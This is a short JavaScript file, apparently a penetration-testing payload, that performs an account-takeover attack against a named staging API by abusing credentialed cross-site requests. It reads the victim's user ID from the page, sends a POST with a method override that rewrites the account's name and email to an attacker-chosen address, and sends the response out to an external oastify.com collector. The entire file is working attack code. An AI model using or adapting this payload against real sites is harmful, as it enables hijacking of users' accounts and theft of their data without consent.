// a.js - CORS-Bypass Account Takeover (Simple Request)

(function() {
    const API_BASE = 'https://basilstagingapi.coraltreetech.com';
    const EXFIL_URL = 'https://39aq7kpp3uc4qea16688fkzpegk78ywn.oastify.com/log';

    // 1. Get User ID from the page (NOT from API, to avoid CORS)
    function getUserId() {
        // Try to extract from URL
        const urlMatch = window.location.href.match(/\/users\/([a-f0-9-]{36})/i);
        if (urlMatch) return urlMatch[1];

        // Try hidden input fields
        const input = document.querySelector('input[name="id"], input[name="userId"], input[name="user_id"]');
        if (input && input.value) return input.value;

        // Try global JavaScript variables
        if (window.user && window.user.id) return window.user.id;
        if (window.currentUser && window.currentUser.id) return window.currentUser.id;

        // Try to find it in the DOM text (maybe displayed somewhere)
        const bodyText = document.body.innerText;
        const uuidMatch = bodyText.match(/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})/i);
        if (uuidMatch) return uuidMatch[1];

        return null;
    }

    const userId = getUserId();

    if (!userId) {
        navigator.sendBeacon(EXFIL_URL, 'ERROR: User ID not found in DOM');
        return;
    }

    // 2. Build the form-urlencoded body (supports _method override)
    const body = new URLSearchParams();
    body.append('_method', 'PUT');               // Override POST to PUT
    body.append('user[first_name]', 'Hacked');
    body.append('user[email]', 'harshit.j+regular1@cywarden.com');
    // Add more fields if needed:
    // body.append('user[last_name]', 'ByXSS');

    // 3. Send the request — NO custom headers, NO preflight!
    fetch(API_BASE + '/api/v1/users/' + userId, {
        method: 'POST',                          // Use POST (Simple Request)
        credentials: 'include',                  // Sends HttpOnly cookies automatically
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
            // NO X-Xsrf-Token header (cookies handle auth)
        },
        body: body.toString()
    })
    .then(response => {
        // Exfiltrate the result
        return response.text().then(text => {
            const data = {
                status: response.status,
                statusText: response.statusText,
                body: text
            };
            navigator.sendBeacon(EXFIL_URL, JSON.stringify(data));
        });
    })
    .catch(error => {
        navigator.sendBeacon(EXFIL_URL, 'Fetch Error: ' + error.message);
    });

})();
